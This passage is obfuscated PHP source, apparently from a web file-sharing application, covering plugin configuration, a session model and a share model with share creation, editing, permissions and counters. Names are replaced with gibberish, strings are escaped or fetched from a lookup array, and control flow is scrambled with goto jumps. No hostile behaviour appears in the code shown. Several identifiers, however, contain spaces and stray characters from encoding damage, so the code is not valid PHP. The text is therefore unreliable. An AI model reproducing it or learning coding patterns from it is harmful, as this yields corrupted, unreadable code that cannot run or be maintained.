(!$a¦ñµÊ²óÏ && is_array($a¦ñµÊ²óÏ[$eÃ¿£òï¼[1784]])) { return $A¯ö¢¸³øñ; } foreach ($a¦ñµÊ²óÏ[$eÃ¿£òï¼[1784]] as $d±ƒ¦Ã®Áö => $d¿Ñ„ÍÅõå) { if (!isset($d¿Ñ„ÍÅõå[$eÃ¿£òï¼[370]]) || isset($A¯ö¢¸³øñ[$d±ƒ¦Ã®Áö])) { continue; } $A¯ö¢¸³øñ[$d±ƒ¦Ã®Áö] = $d¿Ñ„ÍÅõå[$eÃ¿£òï¼[370]]; } return $A¯ö¢¸³øñ; } public function getPackageJson($bí£ôÂ»»±) { return Hook::apply($bí£ôÂ»»± . $_SERVER[Â€Á›¨õ][1785]); } public function getConfig($c³Âà¾Øà, $D»£Ï…ğ© = false) { $CŸäÔ¥èª­ =& $_SERVER[Â€Á›¨õ]; $CÏé³ºÆ©“ = array(); $fñ±µ¾¢ = $this->loadList($c³Âà¾Øà); if ($fñ±µ¾¢ && is_array($fñ±µ¾¢[$CŸäÔ¥èª­[6]])) { $CÏé³ºÆ©“ = $fñ±µ¾¢[$CŸäÔ¥èª­[6]]; } if (!$CÏé³ºÆ©“ || $D»£Ï…ğ©) { $CÏé³ºÆ©“ = $this->getConfigDefault($c³Âà¾Øà); } return $CÏé³ºÆ©“; } public function setConfig($bôÏÏù¾¢Œ, $b¤¸¿ì‡ªè = false) { goto eÑ•Á»ö‹ß; eí‚„éÜÚ½: $a¶²ŞÛ£¸ß = $F”Ç½Œ‹¸¬[$CÅÀÏ²Õï[6]]; if ($b¤¸¿ì‡ªè == !1) { $a¶²ŞÛ£¸ß = array(); $b¤¸¿ì‡ªè = $this->getConfigDefault($bôÏÏù¾¢Œ); } foreach ($b¤¸¿ì‡ªè as $D‘¨ò·Ò¼Ë => $C‘ŒÍ¯®¨ ) { $a¶²ŞÛ£¸ß[$D‘¨ò·Ò¼Ë] = is_string($C‘ŒÍ¯®¨ ) ? trim($C‘ŒÍ¯®¨ ) : $C‘ŒÍ¯®¨ ; } goto d˜“¿ªê±; d˜“¿ªê±: $this->update($F”Ç½Œ‹¸¬[$CÅÀÏ²Õï[388]], array($CÅÀÏ²Õï[6] => $a¶²ŞÛ£¸ß)); goto dÜÆ§Ö—í; eÑ•Á»ö‹ß: $CÅÀÏ²Õï =& $_SERVER[Â€Á›¨õ]; $F”Ç½Œ‹¸¬ = $this->loadList($bôÏÏù¾¢Œ); if (!$F”Ç½Œ‹¸¬) { return !1; } goto eí‚„éÜÚ½; dÜÆ§Ö—í: } public function viewList() { goto C­¦Ë—Š›Ã; eˆºÒ‚²İ„: return $Eã„ÅÂæ˜•; goto dš¿é„İš; bÙ¯›…ãÀ›: $AÓ¨¾½©¤Ú = $this->loadPluginList(); $Eã„ÅÂæ˜• = array(); foreach ($AÓ¨¾½©¤Ú as $F›¤¿—³Î => $C­×ï¬¸Ìß) { unset($C­×ï¬¸Ìß[$eœØÖöôà‘[1777]], $C­×ï¬¸Ìß[$eœØÖöôà‘[6]]); $c»õà§¦ÙÊ = PLUGIN_DIR . $C­×ï¬¸Ìß[$eœØÖöôà‘[28]] . $eœØÖöôà‘[1779]; if (!is_file($c»õà§¦ÙÊ)) { continue; } $C‡‘¼Îõ´‘ = Hook::apply($C­×ï¬¸Ìß[$eœØÖöôà‘[28]] . $eœØÖöôà‘[1785]); if (is_array($C‡‘¼Îõ´‘)) { $Eã„ÅÂæ˜•[$F›¤¿—³Î] = array_merge($C­×ï¬¸Ìß, $C‡‘¼Îõ´‘); } } goto eˆºÒ‚²İ„; C­¦Ë—Š›Ã: $eœØÖöôà‘ =& $_SERVER[Â€Á›¨õ]; $AÓ¨¾½©¤Ú = $this->loadList(); $this->pluginScan($AÓ¨¾½©¤Ú); goto bÙ¯›…ãÀ›; dš¿é„İš: } private function loadPluginList() { $aˆ»´¹­Ë =& $_SERVER[Â€Á›¨õ]; $Dõõ¿Š„´Ÿ = $this->loadList(); if (strtolower(MOD) == $aˆ»´¹­Ë[1786]) { return $Dõõ¿Š„´Ÿ; } $dÔŸº‘ß»ˆ = Hook::trigger($aˆ»´¹­Ë[1787], $Dõõ¿Š„´Ÿ); if ($Dõõ¿Š„´Ÿ && !$dÔŸº‘ß»ˆ) { die; } return $dÔŸº‘ß»ˆ ? $dÔŸº‘ß»ˆ : $Dõõ¿Š„´Ÿ; } private function pluginScan($A»Çá›×¦ä) { $A­¬ÒÀ¶£ =& $_SERVER[Â€Á›¨õ]; recursion_dir(PLUGIN_DIR, $c­êÜÇ°¦Ä, $Eß²¼óã™à, 0); foreach ($c­êÜÇ°¦Ä as $cÉÍ®ÄØ½ô) { $F·åà¥Ÿù” = get_path_this($cÉÍ®ÄØ½ô); if (isset($A»Çá›×¦ä[$F·åà¥Ÿù”]) || !file_exists($cÉÍ®ÄØ½ô . $A­¬ÒÀ¶£[1788]) || !file_exists($cÉÍ®ÄØ½ô . $A­¬ÒÀ¶£[1779])) { continue; } Hook::apply($F·åà¥Ÿù” . $A­¬ÒÀ¶£[1782]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\x79\163\164\145\x6d\137\163\145\x73\163\151\x6f\156"; public function get($eÊãË¬‹¡¢) { $dê–§òå°¹ =& $_SERVER[Â€Á›¨õ]; $AëÀ£ëáìô = $this->where(array($dê–§òå°¹[1789] => $eÊãË¬‹¡¢))->find(); if (!is_array($AëÀ£ëáìô)) { return !1; } return $AëÀ£ëáìô[$dê–§òå°¹[705]]; } public function set($déãçË÷ˆ, $b‚å¾§ĞÔ, $a„¥öÄêÈ¸ = 3600) { $b¬Ç‘ÁÅ ° =& $_SERVER[Â€Á›¨õ]; $CíÑŒ…Áß‰ = array($b¬Ç‘ÁÅ °[1789] => $déãçË÷ˆ, $b¬Ç‘ÁÅ °[1697] => $b‚å¾§ĞÔ, $b¬Ç‘ÁÅ °[1790] => $a„¥öÄêÈ¸ + time()); if (Session::get($b¬Ç‘ÁÅ °[1791])) { $CíÑŒ…Áß‰[$b¬Ç‘ÁÅ °[1501]] = Session::get($b¬Ç‘ÁÅ °[1791]); } else { $CíÑŒ…Áß‰[$b¬Ç‘ÁÅ °[1501]] = 0; } if ($this->get($déãçË÷ˆ)) { return $this->where(array($b¬Ç‘ÁÅ °[1789] => $déãçË÷ˆ))->save($CíÑŒ…Áß‰); } else { return $this->add($CíÑŒ…Áß‰, array(), !0); } } public function remove($C×Şôò¨ßˆ) { return $this->where(array($_SERVER[Â€Á›¨õ][1789] => $C×Şôò¨ßˆ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Â€Á›¨õ][1792] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\150\x61\162\x65"; protected $dataAuto = array(array("\155\x6f\144\x69\146\171\x54\x69\155\145", "\164\x69\x6d\145", "\x69\156\163\x65\x72\164\54\x75\160\x64\141\164\x65", "\146\165\156\143\164\151\x6f\156"), array("\143\162\145\x61\164\x65\124\151\x6d\x65", "\x74\151\155\145", "\151\x6e\163\145\162\x74", "\146\165\156\143\164\151\x6f\x6e"), array("\157\x70\164\x69\x6f\156\x73", '', "\151\x6e\x73\145\x72\164\54\165\160\x64\x61\164\145\54\x73\x65\x6c\x65\x63\164", "\x6a\163\x6f\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($CóÈƒœ„¡±) { $eëË­¨’ËÇ =& $_SERVER[Â€Á›¨õ]; $f½§­œ®½ = isset($CóÈƒœ„¡±[0]) ? $CóÈƒœ„¡±[0] : !1; return array($eëË­¨’ËÇ[1793] => array(USER_ID, $eëË­¨’ËÇ[1794]), $eëË­¨’ËÇ[1737] => array($f½§­œ®½, $eëË­¨’ËÇ[1795])); } protected function listSimple() { $C§êÃ‹À¶ = array($_SERVER[Â€Á›¨õ][1501] => USER_ID); $EÀ‘¸ó™ã‰ = $this->field($this->fieldList)->where($C§êÃ‹À¶)->select(); return $EÀ‘¸ó™ã‰ ? $EÀ‘¸ó™ã‰ : array(); } protected function getInfo($a‰–Ó¤À, $FùÚÈÌÁ® = false) { $a¥ô±ÑÄôØ =& $_SERVER[Â€Á›¨õ]; if ($FùÚÈÌÁ®) { return $this->_getShareInfo(array($a¥ô±ÑÄôØ[462] => $a‰–Ó¤À)); } $aõ¢ãšÙİ = $this->cacheFunctionGet($a¥ô±ÑÄôØ[1744], $a‰–Ó¤À); return $aõ¢ãšÙİ; } public function getInfoByHash($cœğõ°Êî) { return $this->_getShareInfo(array($_SERVER[Â€Á›¨õ][464] => $cœğõ°Êî)); } public function getInfoByPath($Fˆ¿—ÒÌØ) { $eèãë¿Ù¦ª =& $_SERVER[Â€Á›¨õ]; $F‘ÑŞÓ”­Ï = array($eèãë¿Ù¦ª[1501] => USER_ID, $eèãë¿Ù¦ª[390] => $Fˆ¿—ÒÌØ); return $this->_getShareInfo($F‘ÑŞÓ”­Ï); } public function getInfoBySourcePath($dêªç™„ç­) { $C¡µ‡ç¿ê¢ =& $_SERVER[Â€Á›¨õ]; $d°ãæç¯×œ = array($C¡µ‡ç¿ê¢[1501] => USER_ID, $C¡µ‡ç¿ê¢[1045] => $dêªç™„ç­); return $this->_getShareInfo($d°ãæç¯×œ); } private function _getShareInfo($BŒï÷ƒ‹îå) { goto DÕÌ†ª½Ö‡; a´²Ô•‰´é: if ($D­ÔØÒÔ[$F ¼¯Ä­Ù[390]] == $F ¼¯Ä­Ù[491]) { $D­ÔØÒÔ[$F ¼¯Ä­Ù[84]] = IO::info($D­ÔØÒÔ[$F ¼¯Ä­Ù[1045]]); } else { $D­ÔØÒÔ[$F ¼¯Ä­Ù[84]] = Model($F ¼¯Ä­Ù[1178])->pathInfo($D­ÔØÒÔ[$F ¼¯Ä­Ù[390]]); } $D­ÔØÒÔ[$F ¼¯Ä­Ù[1797]] = $Cİ¼ƒßë‰Ô; return $D­ÔØÒÔ; goto cãÛğö¼Şƒ; AˆÌ÷à‹šÓ: $BŒï÷ƒ‹îå = array($F ¼¯Ä­Ù[462] => $D­ÔØÒÔ[$F ¼¯Ä­Ù[462]]); $a™È¦´ÖÍ = $F ¼¯Ä­Ù[1796]; $Cİ¼ƒßë‰Ô = Model($F ¼¯Ä­Ù[559])->order($F ¼¯Ä­Ù[388])->field($a™È¦´ÖÍ)->where($BŒï÷ƒ‹îå)->select(); goto a´²Ô•‰´é; DÕÌ†ª½Ö‡: $F ¼¯Ä­Ù =& $_SERVER[Â€Á›¨õ]; $D­ÔØÒÔ = $this->where($BŒï÷ƒ‹îå)->find(); if (!$D­ÔØÒÔ) { return !1; } goto AˆÌ÷à‹šÓ; cãÛğö¼Şƒ: } protected function getInfoAuth($aÈ¿ª¡») { $F«Úè˜ÖŒ =& $_SERVER[Â€Á›¨õ]; $a¢ÀŠ¨Ò = $this->getInfo($aÈ¿ª¡»); $a¢ÀŠ¨Ò[$F«Úè˜ÖŒ[400]] = Model($F«Úè˜ÖŒ[476])->authMake($a¢ÀŠ¨Ò[$F«Úè˜ÖŒ[1797]]); return $a¢ÀŠ¨Ò; } protected function listData($aèñ…Ğ¸éÏ = null, $cÑ¡°Èè = 300) { $cãå‘¯Ú†‹ =& $_SERVER[Â€Á›¨õ]; $C„òÉ«Ğ‘ = array(array($cãå‘¯Ú†‹[467] => array($cãå‘¯Ú†‹[944], 0), $cãå‘¯Ú†‹[469] => array($cãå‘¯Ú†‹[944], 0), $cãå‘¯Ú†‹[1798] => $cãå‘¯Ú†‹[1752])); if ($aèñ…Ğ¸éÏ == $cãå‘¯Ú†‹[1799]) { $C„òÉ«Ğ‘ = array($cãå‘¯Ú†‹[467] => 1); } else { if ($aèñ…Ğ¸éÏ == $cãå‘¯Ú†‹[1030]) { $C„òÉ«Ğ‘ = array($cãå‘¯Ú†‹[469] => 1); } } $C„òÉ«Ğ‘[$cãå‘¯Ú†‹[1501]] = USER_ID; $a¦Ÿ‘òÜ¹Ç = $this->where($C„òÉ«Ğ‘)->selectPage($cÑ¡°Èè); return $a¦Ÿ‘òÜ¹Ç; } protected function listToMe($bäÏÕ±ò¹ø = 300) { goto aİ›éƒğ³î; fË˜æâä¸ƒ: $e¿’‡ÜÊ–Ò = $this->field($F˜ŒÖåÑ±)->where($fîÕ¼¹å‡ò)->select(); foreach ($e¿’‡ÜÊ–Ò as $fÌ‹õÈÏ˜ø => &$D¦õÑ¢ì‚Â) { $D¦õÑ¢ì‚Â[$eíóÆøßÏà[1797]] = $D‚†õ¥íâ[$D¦õÑ¢ì‚Â[$eíóÆøßÏà[462]]]; } unset($D¦õÑ¢ì‚Â); goto eËƒáŠ‹´ö; fÅÃÎãŠ˜: if ($BË‹³Í“Ş) { $fîÕ¼¹å‡ò = array(array($eíóÆøßÏà[544] => SourceModel::TYPE_USER, $eíóÆøßÏà[478] => USER_ID), array($eíóÆøßÏà[544] => SourceModel::TYPE_GROUP, $eíóÆøßÏà[478] => array($eíóÆøßÏà[7], $BË‹³Í“Ş)), $eíóÆøßÏà[1798] => $eíóÆøßÏà[1752]); } $aŒ”Ÿ‘£òÃ = Model($eíóÆøßÏà[559])->where($fîÕ¼¹å‡ò)->selectPage($bäÏÕ±ò¹ø); $D‚†õ¥íâ = array_to_keyvalue_group($aŒ”Ÿ‘£òÃ[$eíóÆøßÏà[365]], $eíóÆøßÏà[462]); goto FÑÄˆÂ‘ğ½; FÑÄˆÂ‘ğ½: if (!$D‚†õ¥íâ) { return $aŒ”Ÿ‘£òÃ; } $F˜ŒÖåÑ± = $eíóÆøßÏà[1801]; $fîÕ¼¹å‡ò = array($eíóÆøßÏà[462] => array($eíóÆøßÏà[405], array_keys($D‚†õ¥íâ))); goto fË˜æâä¸ƒ; eËƒáŠ‹´ö: $FÃ­‹áè¼È = array($eíóÆøßÏà[1802] => $e¿’‡ÜÊ–Ò, $eíóÆøßÏà[1803] => $aŒ”Ÿ‘£òÃ[$eíóÆøßÏà[362]]); return $FÃ­‹áè¼È; goto e‰„‰±è°; aİ›éƒğ³î: $eíóÆøßÏà =& $_SERVER[Â€Á›¨õ]; $BË‹³Í“Ş = Model($eíóÆøßÏà[1800])->userGroupParents(USER_ID); $fîÕ¼¹å‡ò = array($eíóÆøßÏà[544] => SourceModel::TYPE_USER, $eíóÆøßÏà[478] => USER_ID); goto fÅÃÎãŠ˜; e‰„‰±è°: } protected function shareAdd($C¾âÃÔ¤Ä˜, $bôÙğ”òªñ) { $Bù½—£ÒË” =& $_SERVER[Â€Á›¨õ]; $bô´ƒ±ÚÖˆ = $this->_addShareData($C¾âÃÔ¤Ä˜, $bôÙğ”òªñ); if (!empty($bôÙğ”òªñ[$Bù½—£ÒË”[1804]])) { $this->_shareAuthSet($bô´ƒ±ÚÖˆ, $bôÙğ”òªñ[$Bù½—£ÒË”[1804]]); } $this->shareEventAdd($C¾âÃÔ¤Ä˜, $bôÙğ”òªñ, $Bù½—£ÒË”[1033]); return $bô´ƒ±ÚÖˆ; } private function shareEventAdd($cˆ¾ƒ‚¸, $Dë§¤ŠŸôš, $b´’Ì³‡Üß = "\141\144\144") { goto A´—¿§Ø¡Ì; A´—¿§Ø¡Ì: $DÁ°¶ – ‡ =& $_SERVER[Â€Á›¨õ]; if ($b´’Ì³‡Üß == $DÁ°¶ – ‡[1033]) { if ($Dë§¤ŠŸôš[$DÁ°¶ – ‡[467]] == $DÁ°¶ – ‡[86]) { Model($DÁ°¶ – ‡[528])->eventShare($cˆ¾ƒ‚¸, $DÁ°¶ – ‡[1805]); } if ($Dë§¤ŠŸôš[$DÁ°¶ – ‡[469]] == $DÁ°¶ – ‡[86]) { Model($DÁ°¶ – ‡[528])->eventShare($cˆ¾ƒ‚¸, $DÁ°¶ – ‡[1806]); } return; } $F‹ÍÙãÁÖ = $this->getInfoByPath($cˆ¾ƒ‚¸); goto DäÔæªéµ; e«³¤Ç‹²£: return; goto d¿¸ÛÈ®; DäÔæªéµ: $e­„²Ú‰é± = $DÁ°¶ – ‡[1807]; if ($F‹ÍÙãÁÖ[$DÁ°¶ – ‡[467]] == $DÁ°¶ – ‡[491] && $Dë§¤ŠŸôš[$DÁ°¶ – ‡[467]] == $DÁ°¶ – ‡[86]) { $e­„²Ú‰é± = $DÁ°¶ – ‡[1805]; } if ($F‹ÍÙãÁÖ[$DÁ°¶ – ‡[467]] == $DÁ°¶ – ‡[86] && $Dë§¤ŠŸôš[$DÁ°¶ – ‡[467]] == $DÁ°¶ – ‡[491]) { $e­„²Ú‰é± = $DÁ°¶ – ‡[1808]; } goto Eâ”ôô„ˆÖ; Eâ”ôô„ˆÖ: if ($F‹ÍÙãÁÖ[$DÁ°¶ – ‡[469]] == $DÁ°¶ – ‡[491] && $Dë§¤ŠŸôš[$DÁ°¶ – ‡[469]] == $DÁ°¶ – ‡[86]) { $e­„²Ú‰é± = $DÁ°¶ – ‡[1806]; } if ($F‹ÍÙãÁÖ[$DÁ°¶ – ‡[469]] == $DÁ°¶ – ‡[86] && $Dë§¤ŠŸôš[$DÁ°¶ – ‡[469]] == $DÁ°¶ – ‡[491]) { $e­„²Ú‰é± = $DÁ°¶ – ‡[1809]; } Model($DÁ°¶ – ‡[528])->eventShare($cˆ¾ƒ‚¸, $e­„²Ú‰é±); goto e«³¤Ç‹²£; d¿¸ÛÈ®: } private function _addShareData($E…»Ø–°œ, $fò…¿ÙÂ˜° = array()) { goto aÙóÑæºÖŠ; aÙóÑæºÖŠ: $CÍâ¡õÓÊ =& $_SERVER[Â€Á›¨õ]; $AÓ‚®ÛŒ¢Ğ = array($CÍâ¡õÓÊ[404] => $E…»Ø–°œ, $CÍâ¡õÓÊ[1493] => USER_ID); if ($E…»Ø–°œ == 0) { $AÓ‚®ÛŒ¢Ğ = array($CÍâ¡õÓÊ[1810] => $fò…¿ÙÂ˜°[$CÍâ¡õÓÊ[1045]], $CÍâ¡õÓÊ[1493] => USER_ID); } goto FÉó§÷°„²; Cªİ®¾Ø©ƒ: $b¥ğÎï¶Ë = array($CÍâ¡õÓÊ[1493] => USER_ID, $CÍâ¡õÓÊ[404] => $E…»Ø–°œ, $CÍâ¡õÓÊ[1406] => $CÍâ¡õÓÊ[33], $CÍâ¡õÓÊ[467] => 0, $CÍâ¡õÓÊ[469] => 0, $CÍâ¡õÓÊ[1045] => $CÍâ¡õÓÊ[33], $CÍâ¡õÓÊ[303] => $CÍâ¡õÓÊ[33], $CÍâ¡õÓÊ[824] => $CÍâ¡õÓÊ[33], $CÍâ¡õÓÊ[1811] => 0, $CÍâ¡õÓÊ[1812] => 0, $CÍâ¡õÓÊ[470] => 0, $CÍâ¡õÓÊ[471] => $CÍâ¡õÓÊ[33], $CÍâ¡õÓÊ[464] => $CÍâ¡õÓÊ[33]); $c›ĞÜãÀ§· = explode($CÍâ¡õÓÊ[47], $CÍâ¡õÓÊ[1813]); foreach ($c›ĞÜãÀ§· as $A©£¹“Ù‹õ) { if (!isset($fò…¿ÙÂ˜°[$A©£¹“Ù‹õ])) { continue; } $b¥ğÎï¶Ë[$A©£¹“Ù‹õ] = $fò…¿ÙÂ˜°[$A©£¹“Ù‹õ]; } goto féŞæªÍùœ; féŞæªÍùœ: $B¸œ¾‚ô = $this->add($b¥ğÎï¶Ë); $Dé±÷à„¶¨ = array($CÍâ¡õÓÊ[464] => short_id($B¸œ¾‚ô)); $this->where(array($CÍâ¡õÓÊ[461] => $B¸œ¾‚ô))->save($Dé±÷à„¶¨); goto a½ˆ¬¿ĞÁ«; a½ˆ¬¿ĞÁ«: return $B¸œ¾‚ô; goto bÏÀØ…º”Å; FÉó§÷°„²: if ($BÅÜ¬¹§î¥ = $this->where($AÓ‚®ÛŒ¢Ğ)->find()) { return $BÅÜ¬¹§î¥[$CÍâ¡õÓÊ[462]]; } if ($E…»Ø–°œ == 0) { $FŒ¹öœ‘ó = array($CÍâ¡õÓÊ[28] => get_path_this($fò…¿ÙÂ˜°[$CÍâ¡õÓÊ[75]])); } else { $FŒ¹öœ‘ó = Model($CÍâ¡õÓÊ[767])->sourceInfo($E…»Ø–°œ); if (!$FŒ¹öœ‘ó) { return !1; } } if (!$fò…¿ÙÂ˜°[$CÍâ¡õÓÊ[1406]]) { $fò…¿ÙÂ˜°[$CÍâ¡õÓÊ[1406]] = $FŒ¹öœ‘ó[$CÍâ¡õÓÊ[28]]; } goto Cªİ®¾Ø©ƒ; bÏÀØ…º”Å: } private function _shareAuthSet($BÜ‚è–¦§, $DÁ Äœµ“Å) { goto AÓ°¢„Ş¨; d¥‚Å˜ö¡ˆ: $E¹‡¢Õ±”¥->where(array($CîŠ¨¶Œ‘[462] => $BÜ‚è–¦§))->delete(); $fì¯‡×òëÔ = array(); foreach ($DÁ Äœµ“Å as $E¬ß§†²ß“) { $C®çç¦÷˜è = SourceModel::TYPE_USER; if ($E¬ß§†²ß“[$CîŠ¨¶Œ‘[398]] == SourceModel::TYPE_GROUP) { $C®çç¦÷˜è = SourceModel::TYPE_GROUP; } $CÛî‡â¨Æ = array($CîŠ¨¶Œ‘[462] => $BÜ‚è–¦§, $CîŠ¨¶Œ‘[398] => $C®çç¦÷˜è, $CîŠ¨¶Œ‘[478] => intval($E¬ß§†²ß“[$CîŠ¨¶Œ‘[478]]), $CîŠ¨¶Œ‘[1760] => 0, $CîŠ¨¶Œ‘[1814] => -1); if ($E¬ß§†²ß“[$CîŠ¨¶Œ‘[1760]]) { $CÛî‡â¨Æ[$CîŠ¨¶Œ‘[1760]] = $E¬ß§†²ß“[$CîŠ¨¶Œ‘[1760]]; } else { if ($E¬ß§†²ß“[$CîŠ¨¶Œ‘[1814]]) { $CÛî‡â¨Æ[$CîŠ¨¶Œ‘[1814]] = $E¬ß§†²ß“[$CîŠ¨¶Œ‘[1814]]; } } $fì¯‡×òëÔ[] = $CÛî‡â¨Æ; } goto c—ùøÂ’‹Ò; AÓ°¢„Ş¨: $CîŠ¨¶Œ‘ =& $_SERVER[Â€Á›¨õ]; if (!is_array($DÁ Äœµ“Å)) { return !1; } $E¹‡¢Õ±”¥ = Model($CîŠ¨¶Œ‘[1764]); goto d¥‚Å˜ö¡ˆ; c—ùøÂ’‹Ò: return $E¹‡¢Õ±”¥->addAll($fì¯‡×òëÔ, array(), !0); goto f„’Š±öåï; f„’Š±öåï: } public function numViewAdd($BÁç°íœÒ) { $aô£áõîõä =& $_SERVER[Â€Á›¨õ]; $FÄ‘ƒ¢¡ƒí = array($aô£áõîõä[461] => $BÁç°íœÒ); $this->where($FÄ‘ƒ¢¡ƒí)->setAdd($aô£áõîõä[1811]); } public function numDownloadAdd($cÚĞìØ‚Æ—) { $fÅ‘•—øª¶ =& $_SERVER[Â€Á›¨õ]; $CÔìËç‹°³ = array($fÅ‘•—øª¶[461] => $cÚĞìØ‚Æ—); $this->where($CÔìËç‹°³)->setAdd($fÅ‘•—øª¶[1812]); } protected function shareEdit($A¬³Ä¦˜“¤, $d²¦»Î·í) { goto AÍ—½î –; BÜº‚‰®‚: foreach ($fçéö„àò¥ as $C‡Ã†°£„×) { if (!array_key_exists($C‡Ã†°£„×, $d²¦»Î·í)) { continue; } $cö‹®…¿·[$C‡Ã†°£„×] = $d²¦»Î·í[$C‡Ã†°£„×]; } $this->shareEventAdd($FçµõÒéª[$bÕİº‡“•‡[390]], $d²¦»Î·í, $bÕİº‡“•‡[1631]); $this->where(array($bÕİº‡“•‡[461] => $A¬³Ä¦˜“¤))->save($cö‹®…¿·); goto e¢…–°Ñò; AÍ—½î –: $bÕİº‡“•‡ =& $_SERVER[Â€Á›¨õ]; $FçµõÒéª = $this->getInfo($A¬³Ä¦˜“¤); if (!$FçµõÒéª) { return !1; } goto e‹î‘ùä; e¢…–°Ñò: if (isset($d²¦»Î·í[$bÕİº‡“•‡[1804]])) { $this->_shareAuthSet($A¬³Ä¦˜“¤, $d²¦»Î·í[$bÕİº‡“•‡[1804]]); } return !0; goto d²²·ãÉ–Å; e‹î‘ùä: $this->_checkLinkShare($d²¦»Î·í, $FçµõÒéª); $cö‹®…¿· = array(); $fçéö„àò¥ = explode($bÕİº‡“•‡[47], $bÕİº‡“•‡[1815]); goto BÜº‚‰®‚; d²²·ãÉ–Å: } private function _checkLinkShare($DĞ™¾èÌˆÕ, $BÉ‡Œ³®Ìƒ) { goto E¡ğ§ª»©; bè·ŒİË: $fä¼¶ŠçŒ² = $this->shareFileMeta($f…õ„Å¦„“[$fù´²Ä‡çÅ[441]]); if (isset($fä¼¶ŠçŒ²[$fù´²Ä‡çÅ[370]]) && $fä¼¶ŠçŒ²[$fù´²Ä‡çÅ[370]] == $fù´²Ä‡çÅ[86]) { show_json(LNG($fù´²Ä‡çÅ[1818]), !1); } goto B¿ ¦‹ŠÊ¡; e¨ …İƒ‹¢: if ($BÉ‡Œ³®Ìƒ[$fù´²Ä‡çÅ[84]][$fù´²Ä‡çÅ[29]] != $fù´²Ä‡çÅ[173]) { $D”‡Øò˜ = $this->_folderReport($A¿ëÛÎµò); if (!$D”‡Øò˜) { return; } show_json(LNG($fù´²Ä‡çÅ[1816]) . $fù´²Ä‡çÅ[1817] . $D”‡Øò˜, !1); } $f…õ„Å¦„“ = Model($fù´²Ä‡çÅ[767])->fileInfoGet($BÉ‡Œ³®Ìƒ[$fù´²Ä‡çÅ[84]][$fù´²Ä‡çÅ[390]]); if (!$f…õ„Å¦„“) { return; } goto bè·ŒİË; E¡ğ§ª»©: $fù´²Ä‡çÅ =& $_SERVER[Â€Á›¨õ]; if ($DĞ™¾èÌˆÕ[$fù´²Ä‡çÅ[467]] != $fù´²Ä‡çÅ[86]) { return; } $A¿ëÛÎµò = $BÉ‡Œ³®Ìƒ[$fù´²Ä‡çÅ[84]][$fù´²Ä‡çÅ[390]]; goto e¨ …İƒ‹¢; B¿ ¦‹ŠÊ¡: } private function _folderReport($fˆÑÎ»Ş»¿) { goto BÓ°·éåÇÈ; båŠî¹²½: if (!$A…–ù¯ã¿) { return !1; } $A…–ù¯ã¿ = array_to_keyvalue($A…–ù¯ã¿, $c”¶ôßíô[33], $c”¶ôßíô[441]); $d®Ã†¿ÈÒ = $c”¶ôßíô[47] . $fˆÑÎ»Ş»¿ . $c”¶ôßíô[47]; goto fÒÛ°œ¿Ê­; BÓ°·éåÇÈ: $c”¶ôßíô =& $_SERVER[Â€Á›¨õ]; $Eš‚éÇ«¾ = array($c”¶ôßíô[441] => array($c”¶ôßíô[944], 0), $c”¶ôßíô[702] => 3); $A…–ù¯ã¿ = Model($c”¶ôßíô[1819])->where($Eš‚éÇ«¾)->field($c”¶ôßíô[441])->select(); goto båŠî¹²½; fÒÛ°œ¿Ê­: $Eš‚éÇ«¾ = array($c”¶ôßíô[441] => array($c”¶ôßíô[7], $A…–ù¯ã¿), $c”¶ôßíô[481] => array($c”¶ôßíô[378], "\x25{$d®Ã†¿ÈÒ}\x25"), $c”¶ôßíô[417] => 0); $Fğ†˜¨Ãñù = Model($c”¶ôßíô[767])->where($Eš‚éÇ«¾)->field($c”¶ôßíô[1820])->find(); if (!$Fğ†˜¨Ãñù) { return !1; } goto AğÌä°ë²; fãªÕèÑ³è: $C×ÖËºŸ²‚ = array_to_keyvalue($E‘­ ÖêØä, $c”¶ôßíô[33], $c”¶ôßíô[28]); $C×ÖËºŸ²‚[] = $Fğ†˜¨Ãñù[$c”¶ôßíô[28]]; return implode($c”¶ôßíô[8], $C×ÖËºŸ²‚); goto cèœÃ¿›«’; AğÌä°ë²: $FØÏÅ¡”Ö‰ = substr($Fğ†˜¨Ãñù[$c”¶ôßíô[481]], strpos($Fğ†˜¨Ãñù[$c”¶ôßíô[481]], $d®Ã†¿ÈÒ)); $Eš‚éÇ«¾ = array($c”¶ôßíô[390] => array($c”¶ôßíô[7], trim($FØÏÅ¡”Ö‰, $c”¶ôßíô[47]))); $E‘­ ÖêØä = Model($c”¶ôßíô[767])->where($Eš‚éÇ«¾)->field($c”¶ôßíô[28])->select(); goto fãªÕèÑ³è; cèœÃ¿›«’: } protected function remove($fÑÓÃÙéËÅ) { goto F¹»Œ—·¥; a‚¹¹§ÖˆĞ: for ($d¼ÖƒäÉÃğ = 0; $d¼ÖƒäÉÃğ < count($e§‹ÈàÒŞ‡); $d¼ÖƒäÉÃğ++) { $EÈêÉ§• = $this->getInfo($e§‹ÈàÒŞ‡[$d¼ÖƒäÉÃğ]); if ($EÈêÉ§•[$eí®Ò«ê´›[469]] == $eí®Ò«ê´›[86]) { Model($eí®Ò«ê´›[528])->eventShare($EÈêÉ§•[$eí®Ò«ê´›[390]], $eí®Ò«ê´›[1809]); } if ($EÈêÉ§•[$eí®Ò«ê´›[467]] == $eí®Ò«ê´›[86]) { Model($eí®Ò«ê´›[528])->eventShare($EÈêÉ§•[$eí®Ò«ê´›[390]], $eí®Ò«ê´›[1808]); } } return $B²¨¦³´ßˆ; goto f„Ñê¿«¿; F¹»Œ—·¥: $eí®Ò«ê´› =& $_SERVER[Â€Á›¨õ]; if (is_array($fÑÓÃÙéËÅ)) { $fÑÓÃÙéËÅ = array($eí®Ò«ê´›[7], $fÑÓÃÙéËÅ); } $A“îÆïÄä– = array($eí®Ò«ê´›[462] => $fÑÓÃÙéËÅ); goto fŠ’Ò¬Ûƒ“; fŠ’Ò¬Ûƒ“: $B²¨¦³´ßˆ = $this->where($A“îÆïÄä–)->delete(); if ($B²¨¦³´ßˆ) { Model($eí®Ò«ê´›[559])->where(array($eí®Ò«ê´›[462] => $fÑÓÃÙéËÅ))->delete(); } $e§‹ÈàÒŞ‡ = is_array($fÑÓÃÙéËÅ) ? $fÑÓÃÙéËÅ[1] : array($fÑÓÃÙéËÅ); goto a‚¹¹§ÖˆĞ; f„Ñê¿«¿: } protected function removeBySource($EÛÇÉ•šÌª) { goto CÃ—¢õ—ğ; BÁ®§Áò¨: $this->where($B¬Šæ¨ÅõÈ)->delete(); 